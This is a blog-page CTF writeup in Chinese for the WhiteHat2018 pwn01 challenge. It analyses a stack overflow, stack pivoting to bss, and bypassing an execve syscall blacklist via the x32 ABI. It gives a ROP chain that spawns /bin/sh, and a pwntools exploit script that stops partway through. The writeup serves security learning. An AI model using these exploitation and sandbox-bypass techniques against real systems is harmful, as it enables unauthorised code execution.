<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>WhiteHat2018 Pwn Writeup - localhost - Done with development, it&#39;s time to pwn.</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="M4x" />
  <meta name="description" content="越南的一场比赛, 比赛当天陪女朋友理发, 在理发店看了 pwn01, 刚有思路, 电脑没电了, 第二天接着做时发现比赛结束了. 比赛结束后参考 writeup 复现了三道 pwn, 收获不少" />







<meta name="generator" content="Hugo 0.48" />


<link rel="canonical" href="https://bash-c.github.io/post/whitehat2018-pwn-writeup/" />



<link rel="icon" href="/favicon.ico" />










<link href="/dist/jane.min.css?v=2.7.0" rel="stylesheet">




<meta property="og:title" content="WhiteHat2018 Pwn Writeup" />
<meta property="og:description" content="越南的一场比赛, 比赛当天陪女朋友理发, 在理发店看了 pwn01, 刚有思路, 电脑没电了, 第二天接着做时发现比赛结束了. 比赛结束后参考 writeup 复现了三道 pwn, 收获不少" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bash-c.github.io/post/whitehat2018-pwn-writeup/" /><meta property="article:published_time" content="2018-08-25T20:19:16&#43;08:00"/>
<meta property="article:modified_time" content="2018-08-25T20:19:16&#43;08:00"/>
<meta itemprop="name" content="WhiteHat2018 Pwn Writeup">
<meta itemprop="description" content="越南的一场比赛, 比赛当天陪女朋友理发, 在理发店看了 pwn01, 刚有思路, 电脑没电了, 第二天接着做时发现比赛结束了. 比赛结束后参考 writeup 复现了三道 pwn, 收获不少">


<meta itemprop="datePublished" content="2018-08-25T20:19:16&#43;08:00" />
<meta itemprop="dateModified" content="2018-08-25T20:19:16&#43;08:00" />
<meta itemprop="wordCount" content="3834">



<meta itemprop="keywords" content="pwn,WhiteHat," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="WhiteHat2018 Pwn Writeup"/>
<meta name="twitter:description" content="越南的一场比赛, 比赛当天陪女朋友理发, 在理发店看了 pwn01, 刚有思路, 电脑没电了, 第二天接着做时发现比赛结束了. 比赛结束后参考 writeup 复现了三道 pwn, 收获不少"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo"># </a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          
        
      </li>
    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      # 
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          

        

      </li>
    
      <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          

        

      </li>
    
    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">WhiteHat2018 Pwn Writeup</h1>
      
      <div class="post-meta">
        <span class="post-time"> 2018-08-25 </span>
        <div class="post-category">
            <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
            
          </div>
        <span class="more-meta"> 3834 words </span>
          <span class="more-meta"> 8 min read </span>

        
        
          <span id="busuanzi_container_page_pv">
            | 阅读 <span id="busuanzi_value_page_pv"></span>
          </span>
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Table of Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#pwn01">Pwn01</a>
<ul>
<li><a href="#题目分析">题目分析</a></li>
<li><a href="#漏洞利用">漏洞利用</a>
<ul>
<li><a href="#step-1">Step 1:</a></li>
<li><a href="#step-2">Step 2:</a></li>
<li><a href="#step-3">Step 3:</a></li>
</ul></li>
<li><a href="#exp">exp</a></li>
</ul></li>
<li><a href="#pwn02">Pwn02</a></li>
<li><a href="#pwn03">Pwn03</a>
<ul>
<li><a href="#题目分析-1">题目分析</a>
<ul>
<li><a href="#step-1-1">Step 1:</a></li>
<li><a href="#step-2-1">Step 2:</a></li>
<li><a href="#step-3-1">Step 3:</a></li>
<li><a href="#exp-1">exp</a></li>
</ul></li>
</ul></li>
</ul></li>
</ul>
</nav>
  </div>
</div>

    
    <div class="post-content">
      

<p>越南的一场<a href="https://ctftime.org/event/656">比赛</a>, 比赛当天陪女朋友理发, 在理发店看了 pwn01, 刚有思路, 电脑没电了, 第二天接着做时发现比赛结束了. 比赛结束后参考 <a href="https://ctftime.org/event/656/tasks/">writeup</a> 复现了三道 pwn, 收获不少, 这里记录一下.</p>

<h2 id="pwn01">Pwn01</h2>

<p><a href="https://github.com/0x01f/pwn_repo/tree/master/WhiteHat2018_pwn01">题目链接</a></p>

<h3 id="题目分析">题目分析</h3>

<p>附件给了很多文件, 根据 run.sh 和 ptrace_64.cpp 大概看出程序禁用了 poll, clone, fork, vfork, <strong>execve</strong>, kill, tkill, tgkill 和 write 等系统调用以及过滤了 /home/gift/flag.txt 字符串. 禁用了 execve 说明无论使用 system 还是 one_gadget 都不能 get shell, 过滤了 /home/gift/flag.txt 防止使用 orw 的方法直接读取 flag, 当然这两点都是可以绕过的</p>

<p>再回过头看 giftshop, 程序没有开启 canary 保护(checksec 可能会有误报, 最准确的方法是查看 __stack_chk_fail 附近的汇编). 经过分析, 程序中存在如下的结构体</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">WhiteHat2018_pwn01 <span class="o">[</span>master●●<span class="o">]</span> cat struct
struct GOOD
<span class="o">{</span>
	char name<span class="o">[</span><span class="m">30</span><span class="o">]</span><span class="p">;</span>
	char receiver<span class="o">[</span><span class="m">34</span><span class="o">]</span><span class="p">;</span>
	char *item<span class="p">;</span>
	char *address<span class="p">;</span>
	char *a_letter<span class="p">;</span>
	unsigned int price<span class="p">;</span>
<span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>用 IDA 观察程序流程, 发现程序刚进入时就打印了一个全局变量的地址, 这样 PIE 保护也被绕过了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;OK First, here is a giftcard, it may help you in next time you come here !&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">loyal_flag</span><span class="p">);</span>                  <span class="o">//</span> <span class="n">bypass</span> <span class="n">PIE</span></code></pre></td></tr></table>
</div>
</div>
<p>继续分析, 程序有 order, show_order, delete_order, loyal 等四个功能, 而查看 order 功能时, 就发现了明显的栈溢出以及栈溢出引起的数组越界的漏洞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">    <span class="k">else</span>
    <span class="p">{</span>
      <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter your address: &#34;</span><span class="p">);</span>
      <span class="n">fgets</span><span class="p">(</span><span class="n">good_list</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">address</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
      <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;A letter for her/him:&#34;</span><span class="p">);</span>
      <span class="n">filter</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
      <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>                     <span class="c1">// bof bug
</span><span class="c1"></span>      <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
      <span class="n">good_list</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">a_letter</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x1EuLL</span><span class="p">);</span>
      <span class="n">strncpy</span><span class="p">(</span><span class="n">good_list</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">a_letter</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x1EuLL</span><span class="p">);</span>
    <span class="p">}</span></code></pre></td></tr></table>
</div>
</div>
<h3 id="漏洞利用">漏洞利用</h3>

<h4 id="step-1">Step 1:</h4>

<p>看一下栈的布局发现能完整的覆盖到 order 的 rbp 以及返回地址, 溢出的长度不足以构造长的 ropchain, 考虑使用 stack-pivot 将栈转移到 bss 段(绕过了 PIE 保护, bss 段的地址相当于是已知的), 构造以下的栈结构</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></pre></td>
<td class="lntd">
<pre class="chroma">+-----------------+
|                 |
|padding          |
|                 |
+-----------------+
|elf.bss() + 0x500| &lt;- rbp
+-----------------+
|fgets_gadgets    | &lt;- ret addr
+-----------------+</pre></td></tr></table>
</div>
</div>
<p>其中, fgets_gedgets 为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-assembly" data-lang="assembly">.text:00000000000018B9                 mov     rdx, cs:stdin   ; stream
.text:00000000000018C0                 lea     rax, [rbp+s]
.text:00000000000018C7                 mov     esi, 0E6h       ; n
.text:00000000000018CC                 mov     rdi, rax        ; s
.text:00000000000018CF                 call    _fgets</code></pre></td></tr></table>
</div>
</div>
<p>覆盖返回地址为 elf.address + 0x18B9 时, order 函数将返回到这里, 从 stdin 读取最多 0xE6 个数据并保存到 rbp+s 即 rbp - 0xD0 的位置, 上图的栈结构中, 即会把输入保存到 elf.bss() + 0x500 - 0xD0 上; (不建议使用 bss 开头的地址, 因为 bss 的开头存储了stdin, stdout, stderr 等重要 IO_file 结构体, 随意覆盖可能会在 io 上出现问题)</p>

<p>同时需要注意的是需要给 i 一个合理的值, 否则在执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">    <span class="n">good_list</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">a_letter</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x1EuLL</span><span class="p">);</span></code></pre></td></tr></table>
</div>
</div>
<p>一句时将会因为地址不可写程序发生 crash</p>

<h4 id="step-2">Step 2:</h4>

<p>这样通过一次 rop, 我们就能在 bss 段这一个固定的地址上构造一段相对较长的利用链. <strong>关键是要构造什么样的利用链</strong>, 程序已经过滤了 execve 这个系统调用, 用常规方法就不能 get shell 了, 但实际上这个过滤还是很弱的, 我们有很多方法可以利用, 比如使用 <a href="https://github.com/Naetw/CTF-pwn-tips#use-execveat-to-open-a-shell">execveat</a> 或者使用 x32 abi 这个特性</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></pre></td>
<td class="lntd">
<pre class="chroma">Since 3.4 the Linux kernel has had a feature called the X32 ABI; 64bit syscalls with 32bit pointers.

&#39;&#39;&#39;
WhiteHat2018_pwn01 [master●●] grep -i execve /usr/include/asm/unistd_x32.h
#define __NR_execve (__X32_SYSCALL_BIT + 520)
#define __NR_execveat (__X32_SYSCALL_BIT + 545)
&#39;&#39;&#39;</pre></td></tr></table>
</div>
</div>
<p>简单的说, 就是可以用 0x40000000 加上一个系统调用号的方式进行系统调用, 比如使用 0x40000000 + 520 的方式实现 execve 这个系统调用, 这样就实现了绕过黑名单, 因此可以构造如下的 ropchain 来 get shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python">    <span class="n">prdi</span> <span class="o">=</span> <span class="mh">0x000000000000225f</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">prsi</span> <span class="o">=</span> <span class="mh">0x0000000000002261</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">prdx</span> <span class="o">=</span> <span class="mh">0x0000000000002265</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">prax</span> <span class="o">=</span> <span class="mh">0x0000000000002267</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x0000000000002254</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">binsh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x500</span> <span class="o">-</span> <span class="mh">0xd0</span>
    <span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">prax</span><span class="p">,</span> <span class="mh">0x40000000</span> <span class="o">+</span> <span class="mi">520</span><span class="p">,</span> <span class="n">prdi</span><span class="p">,</span> <span class="n">binsh</span><span class="p">,</span> <span class="n">prsi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">prdx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">syscall</span><span class="p">])</span>
	<span class="c1"># 刚开始还很奇怪这个程序中有这么多好用的 gadget, 后来看了别人 writeup 才知道这是出题方故意加进去的- -</span></code></pre></td></tr></table>
</div>
</div>
<h4 id="step-3">Step 3:</h4>

<p>那么这时候就只差一步了: 控制 rip 到我们构造的 ropchian 就能拿到 shell 了, 这一步不难做到, 第二次 fgets 时, 输入从 rbp - 0xE0 开始, 我们依然能控制 rbp, 并且程序中也可以找到 <code>leave; ret</code> 这个 gadget, 这样再进行一次栈迁移, 控制返回地址为我们输入的 ropchain 的位置即可</p>

<h3 id="exp">exp</h3>

<p>最终的 exp 如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">WhiteHat2018_pwn01</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">exp</span><span class="o">.</span><span class="n">py</span> 
<span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">roputils</span> <span class="kn">as</span> <span class="nn">rp</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">c_uint64</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">elfPath</span> <span class="o">=</span> <span class="s2">&#34;./giftshop&#34;</span>
<span class="n">libcPath</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
<span class="n">remoteAddr</span> <span class="o">=</span> <span class="s2">&#34;pwn01.grandprix.whitehatvn.com&#34;</span>
<span class="n">remotePort</span> <span class="o">=</span> <span class="mi">26129</span>

<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elfPath</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span>
<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elfPath</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>

<span class="k">else</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elfPath</span><span class="p">,</span> <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="p">:</span> <span class="n">libcPath</span><span class="p">})</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remoteAddr</span><span class="p">,</span> <span class="n">remotePort</span><span class="p">)</span>
        <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;info&#34;</span>
    <span class="k">if</span> <span class="n">libcPath</span><span class="p">:</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libcPath</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span>
<span class="n">success</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;{} -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">(</span><span class="n">bps</span> <span class="o">=</span> <span class="p">[]):</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;set follow-fork-mode parent</span><span class="se">\n</span><span class="s2">&#34;</span>
    <span class="n">base</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span>
    <span class="n">cmd</span> <span class="o">+=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;b *{:#x}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">base</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bps</span><span class="p">])</span>
    <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34;c&#34;</span>

    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">bof</span><span class="p">(</span><span class="n">letter</span><span class="p">):</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">letter</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">240</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;y/n</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;n&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;txt</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;6&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;y/n</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;address&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">letter</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34; !</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
